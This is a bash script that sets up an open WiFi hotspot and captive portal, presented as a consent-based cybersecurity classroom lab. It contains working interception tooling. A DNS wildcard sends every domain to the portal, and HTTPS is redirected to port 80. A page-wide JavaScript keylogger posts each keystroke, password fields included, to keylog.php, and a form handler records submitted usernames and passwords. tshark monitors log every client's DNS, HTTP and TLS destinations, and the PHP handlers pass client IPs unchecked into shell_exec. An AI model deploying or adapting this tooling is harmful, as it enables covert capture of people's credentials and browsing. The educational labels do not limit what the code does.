#!/bin/bash

# Ethical Cybersecurity Lab - Transparent WiFi Security Demonstration
# This creates an educational environment with full disclosure and consent

echo "🎓 ETHICAL CYBERSECURITY LAB SETUP"
echo "=================================="
echo "Creating a transparent educational WiFi security demonstration"
echo ""

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo "❌ Please run as root (sudo)"
   exit 1
fi

# Configuration
WIFI_INTERFACE=""
LAB_SSID="CYBERSEC_LAB_DEMO"  # Clearly identifies as educational
PORTAL_DIR="/var/www/html"
LOG_DIR="/var/log/cybersec_lab"
STUDENT_DATA_DIR="/tmp/lab_students"

# Create directories
mkdir -p "$LOG_DIR"
mkdir -p "$STUDENT_DATA_DIR"

echo "🔍 STEP 1: Network Interface Detection"
echo "====================================="

# Auto-detect WiFi interface
echo "Scanning for WiFi interfaces..."
for iface in $(iw dev | grep Interface | awk '{print $2}'); do
    if iw phy$(iw dev $iface info | grep wiphy | awk '{print $2}') info | grep -A 20 "Supported interface modes" | grep -q "* AP"; then
        WIFI_INTERFACE="$iface"
        echo "✅ Found AP-capable interface: $WIFI_INTERFACE"
        break
    fi
done

if [ -z "$WIFI_INTERFACE" ]; then
    echo "❌ No AP-capable WiFi interface found"
    echo "Please ensure you have a WiFi adapter that supports AP mode"
    exit 1
fi

# Show nearby networks for educational context
echo ""
echo "📡 STEP 2: Educational Context - Nearby Networks"
echo "=============================================="
echo "Scanning nearby WiFi networks to demonstrate security concepts..."
timeout 10 iwlist "$WIFI_INTERFACE" scan | grep -E "ESSID|Encryption|Signal" | head -20
echo ""
echo "💡 Educational Note: This shows how easy it is to see nearby networks"
echo "   In real attacks, malicious actors often mimic these legitimate networks"
echo ""

echo "🛠️ STEP 3: Lab Environment Setup"
echo "==============================="

# Clean up any existing processes
echo "Cleaning up previous lab sessions..."
pkill create_ap 2>/dev/null
pkill hostapd 2>/dev/null
pkill dnsmasq 2>/dev/null
pkill tcpdump 2>/dev/null
systemctl stop NetworkManager 2>/dev/null

# Reset interface
echo "Preparing WiFi interface..."
ip link set "$WIFI_INTERFACE" down
iw dev "$WIFI_INTERFACE" set type managed 2>/dev/null || true
ip addr flush dev "$WIFI_INTERFACE"
ip link set "$WIFI_INTERFACE" up

# Install required packages
echo "Installing required packages..."
apt update -qq
apt install -y apache2 dnsmasq hostapd php tshark tcpdump

echo ""
echo "🎯 STEP 4: Creating Educational Access Point"
echo "========================================="

# Create hostapd configuration
cat <<EOF > /tmp/lab_hostapd.conf
# Educational Lab Access Point Configuration
interface=$WIFI_INTERFACE
driver=nl80211
ssid=$LAB_SSID
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
ieee80211n=1
EOF

# Configure interface
ip addr add 192.168.100.1/24 dev "$WIFI_INTERFACE"
LAB_IP="192.168.100.1"

# Start hostapd
echo "Starting educational access point: $LAB_SSID"
hostapd /tmp/lab_hostapd.conf > "$LOG_DIR/hostapd.log" 2>&1 &
sleep 5

if ! ps aux | grep -q "[h]ostapd"; then
    echo "❌ Failed to start access point"
    echo "Check log: $LOG_DIR/hostapd.log"
    exit 1
fi

echo "✅ Educational access point '$LAB_SSID' is active"

echo ""
echo "📚 STEP 5: Creating Educational Web Portal"
echo "========================================"

# Create comprehensive educational portal
cat <<'EOF' > "$PORTAL_DIR/index.html"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎓 Cybersecurity Lab - WiFi Security Demonstration</title>
    <style>
        body { 
            font-family: 'Arial', sans-serif; 
            margin: 0; padding: 20px; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
        }
        .container {
            max-width: 800px; margin: 0 auto;
            background: white; padding: 30px; border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        .header {
            text-align: center; background: #2c3e50; color: white;
            padding: 25px; margin: -30px -30px 30px -30px;
            border-radius: 15px 15px 0 0;
        }
        .lab-badge {
            display: inline-block; background: #27ae60; color: white;
            padding: 8px 16px; border-radius: 20px; font-size: 14px;
            margin-bottom: 10px; font-weight: bold;
        }
        .warning-section {
            background: #fff3cd; border-left: 5px solid #ffc107;
            padding: 20px; margin: 20px 0; border-radius: 0 8px 8px 0;
        }
        .demo-section {
            background: #d1ecf1; border-left: 5px solid #17a2b8;
            padding: 20px; margin: 20px 0; border-radius: 0 8px 8px 0;
        }
        .monitoring-section {
            background: #f8d7da; border-left: 5px solid #dc3545;
            padding: 20px; margin: 20px 0; border-radius: 0 8px 8px 0;
        }
        .consent-section {
            background: #d4edda; border: 2px solid #28a745;
            padding: 25px; margin: 30px 0; border-radius: 10px;
        }
        .form-group { margin: 15px 0; }
        label { display: block; margin-bottom: 8px; font-weight: bold; }
        input[type="text"], input[type="email"] {
            width: 100%; padding: 12px; border: 2px solid #ddd;
            border-radius: 6px; box-sizing: border-box; font-size: 16px;
        }
        .checkbox-group {
            margin: 15px 0; padding: 15px; background: white;
            border-radius: 8px; border: 1px solid #ddd;
        }
        .checkbox-group input[type="checkbox"] {
            margin-right: 10px; transform: scale(1.2);
        }
        .checkbox-group label { margin-bottom: 0; cursor: pointer; }
        button {
            background: #28a745; color: white; padding: 15px 30px;
            border: none; border-radius: 8px; font-size: 18px;
            font-weight: bold; cursor: pointer; width: 100%;
            transition: all 0.3s ease;
        }
        button:disabled {
            background: #6c757d; cursor: not-allowed;
        }
        button:hover:enabled {
            background: #218838; transform: translateY(-2px);
        }
        .info-box {
            background: #e9ecef; padding: 15px; border-radius: 8px;
            margin: 15px 0; border-left: 4px solid #007bff;
        }
        .student-info {
            background: #f8f9fa; padding: 20px; border-radius: 8px;
            margin: 20px 0; border: 1px solid #dee2e6;
        }
        ul { padding-left: 20px; }
        li { margin: 8px 0; }
        .highlight { background: #fff3cd; padding: 2px 6px; border-radius: 3px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="lab-badge">🎓 EDUCATIONAL LAB</div>
            <h1>WiFi Security Demonstration</h1>
            <p>Interactive Cybersecurity Learning Environment</p>
        </div>

        <div class="warning-section">
            <h2>🔍 What You're Learning</h2>
            <p><strong>Welcome to our cybersecurity educational lab!</strong> This is a <em>controlled learning environment</em> designed to teach you about WiFi security vulnerabilities in a safe, ethical way.</p>
            
            <div class="info-box">
                <strong>Educational Objectives:</strong>
                <ul>
                    <li>Understand how public WiFi networks can monitor traffic</li>
                    <li>Learn why HTTPS and VPNs are important</li>
                    <li>Experience how easily data can be intercepted</li>
                    <li>Practice identifying security risks</li>
                </ul>
            </div>
        </div>

        <div class="demo-section">
            <h2>📊 Laboratory Monitoring Capabilities</h2>
            <p>To demonstrate security vulnerabilities, this lab environment monitors:</p>
            <ul>
                <li><strong>🌐 Web Traffic:</strong> URLs visited, HTTP requests, DNS queries</li>
                <li><strong>⌨️ Keystroke Patterns:</strong> Typing behavior for security analysis</li>
                <li><strong>📱 Device Information:</strong> Network identifiers and connection data</li>
                <li><strong>🔒 Security Headers:</strong> HTTPS usage and encryption status</li>
            </ul>
            
            <div class="info-box">
                <strong>💡 Real-World Parallel:</strong> This simulates what malicious WiFi hotspots can do in cafes, airports, and public spaces. The difference is you know about it and consent to it!
            </div>
        </div>

        <div class="monitoring-section">
            <h2>⚠️ Important Safeguards</h2>
            <ul>
                <li><strong>Educational Use Only:</strong> All data is for learning purposes</li>
                <li><strong>No Real Credentials:</strong> Use only test/dummy information</li>
                <li><strong>Controlled Environment:</strong> This is a supervised lab setting</li>
                <li><strong>Data Protection:</strong> All logs are securely managed and deleted after class</li>
            </ul>
        </div>

        <div class="student-info">
            <h3>📝 Student Registration</h3>
            <p>Please provide your information for this educational session:</p>
            
            <form id="labForm" action="register.php" method="POST">
                <div class="form-group">
                    <label for="student_name">Your Name:</label>
                    <input type="text" id="student_name" name="student_name" required>
                </div>
                
                <div class="form-group">
                    <label for="student_email">Email (for lab results):</label>
                    <input type="email" id="student_email" name="student_email" required>
                </div>
                
                <div class="form-group">
                    <label for="course_code">Course/Class Code:</label>
                    <input type="text" id="course_code" name="course_code" placeholder="e.g., CYBER101" required>
                </div>
            </form>
        </div>

        <div class="consent-section">
            <h3>✅ Educational Consent & Understanding</h3>
            <p>Please confirm your understanding by checking all boxes:</p>
            
            <div class="checkbox-group">
                <input type="checkbox" id="understand_lab" onchange="checkConsent()">
                <label for="understand_lab">
                    I understand this is an <strong>educational cybersecurity demonstration</strong> in a controlled lab environment
                </label>
            </div>
            
            <div class="checkbox-group">
                <input type="checkbox" id="consent_monitoring" onchange="checkConsent()">
                <label for="consent_monitoring">
                    I <strong>consent to network monitoring</strong> for educational purposes and understand what data is being collected
                </label>
            </div>
            
            <div class="checkbox-group">
                <input type="checkbox" id="no_real_data" onchange="checkConsent()">
                <label for="no_real_data">
                    I will <strong>NOT enter real passwords</strong> or access sensitive personal accounts during this demonstration
                </label>
            </div>
            
            <div class="checkbox-group">
                <input type="checkbox" id="educational_purpose" onchange="checkConsent()">
                <label for="educational_purpose">
                    I understand this lab teaches <strong>WiFi security awareness</strong> and will apply these lessons to protect myself on public networks
                </label>
            </div>
            
            <div class="checkbox-group">
                <input type="checkbox" id="final_agreement" name="lab_consent" onchange="checkConsent()">
                <label for="final_agreement">
                    <strong>I agree to participate</strong> in this educational cybersecurity demonstration under these terms
                </label>
            </div>
        </div>
        
        <button type="submit" form="labForm" id="submitBtn" disabled>
            🚀 BEGIN CYBERSECURITY LAB EXPERIENCE
        </button>
        
        <div class="info-box" style="margin-top: 20px;">
            <strong>🛡️ Remember:</strong> On real public WiFi, always use HTTPS websites, enable VPN protection, avoid sensitive transactions, and verify network authenticity!
        </div>
    </div>

    <script>
        function checkConsent() {
            const checkboxes = ['understand_lab', 'consent_monitoring', 'no_real_data', 'educational_purpose', 'final_agreement'];
            const submitBtn = document.getElementById('submitBtn');
            
            const allChecked = checkboxes.every(id => document.getElementById(id).checked);
            submitBtn.disabled = !allChecked;
            
            if (allChecked) {
                submitBtn.style.background = '#28a745';
                submitBtn.textContent = '🚀 BEGIN CYBERSECURITY LAB EXPERIENCE';
            }
        }
        
        // Educational keystroke monitoring with full transparency
        let keystrokeCount = 0;
        document.addEventListener('keydown', function(e) {
            // Only monitor after consent
            if (document.getElementById('final_agreement').checked) {
                keystrokeCount++;
                
                // Log educational keystroke data
                logEducationalKeystroke(e.key, e.target.name || e.target.id || 'general');
                
                // Show educational feedback occasionally
                if (keystrokeCount % 50 === 0) {
                    console.log(`Educational Note: ${keystrokeCount} keystrokes monitored for security analysis`);
                }
            }
        });
        
        function logEducationalKeystroke(key, field) {
            // Don't log sensitive keys
            if (['Shift', 'Control', 'Alt', 'Meta', 'Tab', 'CapsLock'].includes(key)) {
                return;
            }
            
            fetch('keylog.php', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `key=${encodeURIComponent(key)}&field=${encodeURIComponent(field)}&session_type=educational`
            });
        }
        
        // Form validation
        document.getElementById('labForm').addEventListener('submit', function(e) {
            const checkboxes = ['understand_lab', 'consent_monitoring', 'no_real_data', 'educational_purpose', 'final_agreement'];
            const allChecked = checkboxes.every(id => document.getElementById(id).checked);
            
            if (!allChecked) {
                e.preventDefault();
                alert('Please review and agree to all educational terms before proceeding.');
            }
        });
    </script>
</body>
</html>
EOF

# Create student registration handler
cat <<'EOF' > "$PORTAL_DIR/register.php"
<?php
// Educational Lab Student Registration Handler

$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';

// Get MAC address
$mac = trim(shell_exec("arp -n $ip 2>/dev/null | grep $ip | awk '{print \$3}' | head -1"));
if (empty($mac)) {
    $mac = 'unknown';
}

// Collect educational session data
$student_data = [
    'timestamp' => $timestamp,
    'ip_address' => $ip,
    'mac_address' => $mac,
    'student_name' => $_POST['student_name'] ?? '',
    'student_email' => $_POST['student_email'] ?? '',
    'course_code' => $_POST['course_code'] ?? '',
    'user_agent' => $user_agent,
    'consent_given' => isset($_POST['lab_consent']) ? 'YES' : 'NO'
];

// Log student registration
$log_entry = sprintf(
    "[%s] STUDENT REGISTERED - Name: %s | Email: %s | Course: %s | IP: %s | MAC: %s | Consent: %s\n",
    $timestamp,
    $student_data['student_name'],
    $student_data['student_email'], 
    $student_data['course_code'],
    $ip,
    $mac,
    $student_data['consent_given']
);

file_put_contents('/var/log/cybersec_lab/student_registrations.log', $log_entry, FILE_APPEND | LOCK_EX);

// Grant network access for educational monitoring
$auth_entry = "$ip|$mac|{$student_data['student_name']}|$timestamp\n";
file_put_contents('/tmp/lab_students/authorized.txt', $auth_entry, FILE_APPEND | LOCK_EX);

// Signal access control to grant internet access
file_put_contents('/tmp/lab_students/grant_access.txt', "$ip\n", FILE_APPEND | LOCK_EX);

// Redirect to educational success page
header('Location: lab_active.html');
exit;
?>
EOF

# Create educational success page
cat <<'EOF' > "$PORTAL_DIR/lab_active.html"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎓 Lab Active - Cybersecurity Monitoring Demonstration</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #28a745, #20c997);
            margin: 0; padding: 20px; min-height: 100vh;
        }
        .container {
            max-width: 700px; margin: 0 auto; background: white;
            padding: 30px; border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        .success-header {
            text-align: center; background: #28a745; color: white;
            padding: 25px; margin: -30px -30px 30px -30px;
            border-radius: 15px 15px 0 0;
        }
        .status-active {
            background: #d4edda; border: 2px solid #28a745;
            padding: 20px; border-radius: 10px; margin: 20px 0;
            text-align: center;
        }
        .monitoring-info {
            background: #fff3cd; border-left: 5px solid #ffc107;
            padding: 20px; margin: 20px 0;
        }
        .test-section {
            background: #f8f9fa; padding: 20px; border-radius: 10px;
            margin: 20px 0; border: 1px solid #dee2e6;
        }
        .test-link {
            display: block; margin: 10px 0; padding: 12px 20px;
            background: #007bff; color: white; text-decoration: none;
            border-radius: 6px; text-align: center; font-weight: bold;
        }
        .test-link:hover { background: #0056b3; }
        .security-tips {
            background: #e2e3e5; padding: 20px; border-radius: 10px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="success-header">
            <h1>🎓 Cybersecurity Lab Active</h1>
            <p>Educational Network Monitoring Demonstration</p>
        </div>

        <div class="status-active">
            <h2>✅ Lab Session Active</h2>
            <p>You are now connected to the educational cybersecurity demonstration network.</p>
            <p><strong>All your network activity is being monitored for educational analysis.</strong></p>
        </div>

        <div class="monitoring-info">
            <h3>📊 What's Being Monitored Right Now:</h3>
            <ul>
                <li><strong>🌐 Website Visits:</strong> Every URL you access</li>
                <li><strong>🔍 DNS Queries:</strong> Domain name lookups</li>
                <li><strong>⌨️ Keystroke Patterns:</strong> Typing behavior analysis</li>
                <li><strong>📱 Connection Data:</strong> Network usage patterns</li>
                <li><strong>🔒 Security Headers:</strong> HTTPS vs HTTP usage</li>
            </ul>
        </div>

        <div class="test-section">
            <h3>🧪 Educational Test Activities</h3>
            <p>Try these activities to see cybersecurity monitoring in action:</p>
            
            <a href="http://neverssl.com" class="test-link" target="_blank">
                📄 Test HTTP Website (Unencrypted)
            </a>
            <a href="https://www.wikipedia.org" class="test-link" target="_blank">
                🔒 Test HTTPS Website (Encrypted)
            </a>
            <a href="http://example.com" class="test-link" target="_blank">
                🌐 Test Simple HTTP Site
            </a>
            <a href="test_form.html" class="test-link">
                📝 Test Form Submission Monitoring
            </a>
        </div>

        <div class="security-tips">
            <h3>🛡️ Security Lessons to Remember:</h3>
            <ul>
                <li><strong>Always use HTTPS:</strong> Look for the lock icon in your browser</li>
                <li><strong>Enable VPN on public WiFi:</strong> Encrypts all your traffic</li>
                <li><strong>Verify network names:</strong> Attackers create fake hotspots</li>
                <li><strong>Avoid sensitive activities:</strong> No banking/shopping on public WiFi</li>
                <li><strong>Keep software updated:</strong> Security patches protect you</li>
            </ul>
        </div>

        <div style="text-align: center; margin-top: 30px;">
            <p><strong>🎓 Educational Goal:</strong> Apply these lessons to stay secure on real public networks!</p>
        </div>
    </div>
</body>
</html>
EOF

# Create test form for educational purposes
cat <<'EOF' > "$PORTAL_DIR/test_form.html"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🧪 Form Testing - Educational Demo</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; background: #f8f9fa; }
        .container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; }
        .warning { background: #fff3cd; padding: 15px; border-radius: 5px; margin-bottom: 20px; }
        .form-group { margin: 15px 0; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input, textarea { width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { background: #007bff; color: white; padding: 12px 24px; border: none; border-radius: 4px; cursor: pointer; }
        button:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🧪 Form Monitoring Demonstration</h1>
        
        <div class="warning">
            <strong>⚠️ Educational Notice:</strong> This form demonstrates how data can be intercepted on unsecured networks. Use only fake/test information!
        </div>
        
        <form action="form_test.php" method="POST">
            <div class="form-group">
                <label>Test Username (fake only):</label>
                <input type="text" name="test_username" placeholder="test_user_123">
            </div>
            <div class="form-group">
                <label>Test Password (fake only):</label>
                <input type="password" name="test_password" placeholder="fake_password">
            </div>
            <div class="form-group">
                <label>Test Email (fake only):</label>
                <input type="email" name="test_email" placeholder="test@example.com">
            </div>
            <div class="form-group">
                <label>Test Message:</label>
                <textarea name="test_message" rows="4" placeholder="This is a test message for educational monitoring demonstration"></textarea>
            </div>
            <button type="submit">🔍 Submit Test Data (Educational)</button>
        </form>
        
        <p style="margin-top: 20px; color: #6c757d; font-size: 14px;">
            <strong>Educational Purpose:</strong> This demonstrates how form data can be captured on unsecured networks.
        </p>
    </div>
</body>
</html>
EOF

echo "✅ Educational web portal created"

echo ""
echo "🔒 STEP 6: Network Access Control Setup"
echo "====================================="

# Configure DHCP and DNS
cat <<EOF > /tmp/lab_dnsmasq.conf
interface=$WIFI_INTERFACE
dhcp-range=192.168.100.50,192.168.100.150,12h
dhcp-option=3,$LAB_IP
dhcp-option=6,$LAB_IP
address=/#/$LAB_IP
log-queries
log-facility=$LOG_DIR/dns_queries.log
no-resolv
server=8.8.8.8
server=8.8.4.4
EOF

# Start DNS/DHCP
dnsmasq -C /tmp/lab_dnsmasq.conf --pid-file=/tmp/lab_dnsmasq.pid > "$LOG_DIR/dnsmasq.log" 2>&1 &

# Set up firewall rules for controlled access
iptables -P FORWARD DROP
iptables -A FORWARD -i "$WIFI_INTERFACE" -p tcp --dport 80 -d "$LAB_IP" -j ACCEPT
iptables -A FORWARD -i "$WIFI_INTERFACE" -p udp --dport 53 -j ACCEPT

# Redirect HTTP/HTTPS to portal initially
iptables -t nat -A PREROUTING -i "$WIFI_INTERFACE" -p tcp --dport 80 ! -d "$LAB_IP" -j DNAT --to-destination "$LAB_IP:80"
iptables -t nat -A PREROUTING -i "$WIFI_INTERFACE" -p tcp --dport 443 ! -d "$LAB_IP" -j DNAT --to-destination "$LAB_IP:80"

# Enable internet access through primary interface
PRIMARY_IFACE=$(ip route show default | awk '{print $5}' | head -1)
if [ ! -z "$PRIMARY_IFACE" ]; then
    iptables -t nat -A POSTROUTING -o "$PRIMARY_IFACE" -j MASQUERADE
fi

echo "✅ Network access control configured"

echo ""
echo "📊 STEP 7: Educational Monitoring Setup"
echo "===================================="

# Create educational monitoring script
cat <<'EOF' > /tmp/educational_monitor.py
#!/usr/bin/env python3
import subprocess
import threading
import time
from datetime import datetime

def log_educational_activity(message, logfile):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    try:
        with open(logfile, 'a') as f:
            f.write(f"[{timestamp}] {message}\n")
            f.flush()
    except Exception as e:
        print(f"Logging error: {e}")

def monitor_educational_dns():
    """Monitor DNS queries for educational analysis"""
    try:
        cmd = ["tshark", "-i", "INTERFACE_PLACEHOLDER", "-Y", "dns.flags.response == 0", 
               "-T", "fields", "-e", "ip.src", "-e", "dns.qry.name", "-l"]
        
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        for line in iter(process.stdout.readline, ''):
            if line.strip():
                parts = line.strip().split('\t')
                if len(parts) >= 2 and parts[0].startswith('192.168.100.'):
                    domain = parts[1]
                    student_ip = parts[0]
                    log_educational_activity(
                        f"DNS_LOOKUP - Student:{student_ip} -> Domain:{domain}",
                        '/var/log/cybersec_lab/educational_dns.log'
                    )
    except Exception as e:
        print(f"DNS monitoring error: {e}")

def monitor_educational_http():
    """Monitor HTTP traffic for educational analysis"""
    try:
        cmd = ["tshark", "-i", "INTERFACE_PLACEHOLDER", "-Y", "http.request", 
               "-T", "fields", "-e", "ip.src", "-e", "http.host", "-e", "http.request.method", 
               "-e", "http.request.uri", "-l"]
        
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        for line in iter(process.stdout.readline, ''):
            if line.strip():
                parts = line.strip().split('\t')
                if len(parts) >= 3 and parts[0].startswith('192.168.100.'):
                    student_ip = parts[0]
                    host = parts[1]
                    method = parts[2] if len(parts) > 2 else 'GET'
                    uri = parts[3] if len(parts) > 3 else '/'
                    
                    log_educational_activity(
                        f"HTTP_REQUEST - Student:{student_ip} -> {method} {host}{uri}",
                        '/var/log/cybersec_lab/educational_http.log'
                    )
    except Exception as e:
        print(f"HTTP monitoring error: {e}")

def monitor_educational_https():
    """Monitor HTTPS connections for educational analysis"""
    try:
        cmd = ["tshark", "-i", "INTERFACE_PLACEHOLDER", "-Y", "tls.handshake.type == 1", 
               "-T", "fields", "-e", "ip.src", "-e", "tls.handshake.extensions_server_name", "-l"]
        
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        for line in iter(process.stdout.readline, ''):
            if line.strip():
                parts = line.strip().split('\t')
                if len(parts) >= 2 and parts[0].startswith('192.168.100.'):
                    student_ip = parts[0]
                    server_name = parts[1] if parts[1] else 'unknown'
                    
                    log_educational_activity(
                        f"HTTPS_CONNECTION - Student:{student_ip} -> {server_name}",
                        '/var/log/cybersec_lab/educational_https.log'
                    )
    except Exception as e:
        print(f"HTTPS monitoring error: {e}")

def monitor_student_activity():
    """Monitor general student network activity"""
    try:
        cmd = ["tshark", "-i", "INTERFACE_PLACEHOLDER", "-f", "src net 192.168.100.0/24", 
               "-T", "fields", "-e", "ip.src", "-e", "ip.dst", "-e", "tcp.dstport", 
               "-e", "udp.dstport", "-l"]
        
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        for line in iter(process.stdout.readline, ''):
            if line.strip():
                parts = line.strip().split('\t')
                if len(parts) >= 2 and parts[0].startswith('192.168.100.'):
                    student_ip = parts[0]
                    dest_ip = parts[1]
                    tcp_port = parts[2] if len(parts) > 2 else ''
                    udp_port = parts[3] if len(parts) > 3 else ''
                    
                    port = tcp_port or udp_port
                    service = {
                        '80': 'HTTP', '443': 'HTTPS', '53': 'DNS', '21': 'FTP',
                        '22': 'SSH', '25': 'SMTP', '993': 'IMAPS', '995': 'POP3S'
                    }.get(port, port)
                    
                    if not dest_ip.startswith('192.168.100.'):  # External traffic only
                        log_educational_activity(
                            f"NETWORK_ACTIVITY - Student:{student_ip} -> {dest_ip}:{port} ({service})",
                            '/var/log/cybersec_lab/educational_activity.log'
                        )
    except Exception as e:
        print(f"Activity monitoring error: {e}")

if __name__ == "__main__":
    print(f"Starting educational monitoring at {datetime.now()}")
    
    # Create log files
    import os
    os.makedirs('/var/log/cybersec_lab', exist_ok=True)
    
    # Start monitoring threads
    threads = [
        threading.Thread(target=monitor_educational_dns, daemon=True),
        threading.Thread(target=monitor_educational_http, daemon=True),
        threading.Thread(target=monitor_educational_https, daemon=True),
        threading.Thread(target=monitor_student_activity, daemon=True)
    ]
    
    for thread in threads:
        thread.start()
        time.sleep(1)
    
    print("Educational monitoring active. Press Ctrl+C to stop.")
    
    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        print("Educational monitoring stopped")
EOF

# Replace interface placeholder and start monitoring
sed -i "s/INTERFACE_PLACEHOLDER/$WIFI_INTERFACE/g" /tmp/educational_monitor.py
chmod +x /tmp/educational_monitor.py
python3 /tmp/educational_monitor.py > "$LOG_DIR/monitor.log" 2>&1 &

# Create access control daemon for students
cat <<'EOF' > /tmp/student_access_control.sh
#!/bin/bash

WIFI_INTERFACE="INTERFACE_PLACEHOLDER"
GRANT_FILE="/tmp/lab_students/grant_access.txt"
AUTHORIZED_FILE="/tmp/lab_students/authorized_ips.txt"

touch "$AUTHORIZED_FILE"

while true; do
    if [ -f "$GRANT_FILE" ]; then
        while IFS= read -r ip; do
            if [ ! -z "$ip" ] && ! grep -q "$ip" "$AUTHORIZED_FILE" 2>/dev/null; then
                echo "[$(date)] Granting educational internet access to student: $ip"
                
                # Grant full internet access for educational monitoring
                iptables -I FORWARD 1 -s "$ip" -i "$WIFI_INTERFACE" -j ACCEPT
                iptables -I FORWARD 1 -d "$ip" -o "$WIFI_INTERFACE" -j ACCEPT
                iptables -t nat -I PREROUTING 1 -s "$ip" -i "$WIFI_INTERFACE" -j ACCEPT
                
                echo "$ip" >> "$AUTHORIZED_FILE"
                echo "[$(date)] Educational access granted to $ip" >> /var/log/cybersec_lab/access_control.log
            fi
        done < "$GRANT_FILE"
        > "$GRANT_FILE"
    fi
    sleep 2
done
EOF

sed -i "s/INTERFACE_PLACEHOLDER/$WIFI_INTERFACE/g" /tmp/student_access_control.sh
chmod +x /tmp/student_access_control.sh
/tmp/student_access_control.sh > "$LOG_DIR/access_control.log" 2>&1 &

# Create educational keystroke logger
cat <<'EOF' > "$PORTAL_DIR/keylog.php"
<?php
// Educational Keystroke Logger
error_reporting(E_ALL);
ini_set('display_errors', 0); // Don't show errors to students

$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
$timestamp = date('Y-m-d H:i:s');
$key = $_POST['key'] ?? '';
$field = $_POST['field'] ?? '';
$session_type = $_POST['session_type'] ?? 'general';

// Get student MAC address for educational tracking
$mac = trim(shell_exec("arp -n $ip 2>/dev/null | grep $ip | awk '{print \$3}' | head -1"));
if (empty($mac)) {
    $mac = 'unknown';
}

if (!empty($key)) {
    // Educational keystroke analysis
    $log_entry = "[$timestamp] EDUCATIONAL_KEYSTROKE - IP:$ip | MAC:$mac | Field:$field | Key:$key | Session:$session_type\n";
    file_put_contents('/var/log/cybersec_lab/educational_keystrokes.log', $log_entry, FILE_APPEND | LOCK_EX);
    
    // Create student activity summary
    $summary_entry = "[$timestamp] Student activity detected from $ip\n";
    file_put_contents('/var/log/cybersec_lab/student_activity_summary.log', $summary_entry, FILE_APPEND | LOCK_EX);
}

// Return success for AJAX calls
http_response_code(200);
echo json_encode(['status' => 'logged', 'educational' => true]);
?>
EOF

# Create form test handler
cat <<'EOF' > "$PORTAL_DIR/form_test.php"
<?php
// Educational Form Data Capture Demonstration

$timestamp = date('Y-m-d H:i:s');
$ip = $_SERVER['REMOTE_ADDR'] ?? 'unknown';

// Log all form data for educational analysis
$form_data = $_POST;
$log_entry = "[$timestamp] EDUCATIONAL_FORM_SUBMISSION - IP:$ip - Data:" . json_encode($form_data) . "\n";
file_put_contents('/var/log/cybersec_lab/educational_forms.log', $log_entry, FILE_APPEND | LOCK_EX);

// Redirect to educational result page
header('Location: form_result.html');
exit;
?>
EOF

# Create form result page
cat <<'EOF' > "$PORTAL_DIR/form_result.html"
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>🎓 Form Capture Demonstration</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; background: #f8f9fa; }
        .container { max-width: 600px; margin: 0 auto; background: white; padding: 30px; border-radius: 10px; }
        .success { background: #d4edda; border: 1px solid #c3e6cb; padding: 15px; border-radius: 5px; color: #155724; }
        .warning { background: #fff3cd; border: 1px solid #ffeaa7; padding: 15px; border-radius: 5px; color: #856404; margin: 20px 0; }
        .back-btn { display: inline-block; margin-top: 20px; padding: 10px 20px; background: #007bff; color: white; text-decoration: none; border-radius: 4px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>✅ Educational Form Capture Complete</h1>
        
        <div class="success">
            <strong>Demonstration Complete!</strong> Your form data has been captured for educational analysis.
        </div>
        
        <div class="warning">
            <h3>🎓 Educational Lesson:</h3>
            <p>This demonstrates how form data can be intercepted on unsecured networks:</p>
            <ul>
                <li><strong>HTTP forms</strong> send data in plain text</li>
                <li><strong>Network administrators</strong> can see all form submissions</li>
                <li><strong>Malicious hotspots</strong> can capture login credentials</li>
                <li><strong>Always use HTTPS</strong> for sensitive forms</li>
            </ul>
        </div>
        
        <a href="lab_active.html" class="back-btn">← Back to Lab Activities</a>
    </div>
</body>
</html>
EOF

# Set proper permissions
chown -R www-data:www-data "$PORTAL_DIR"
chmod 755 "$PORTAL_DIR"
chmod 644 "$PORTAL_DIR"/*.html "$PORTAL_DIR"/*.php

# Start Apache web server
systemctl restart apache2
systemctl enable apache2

echo "✅ Educational monitoring system active"

echo ""
echo "📋 STEP 8: Access Control & Monitoring"
echo "====================================="

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Create captive portal detection files
ln -sf index.html "$PORTAL_DIR/generate_204"
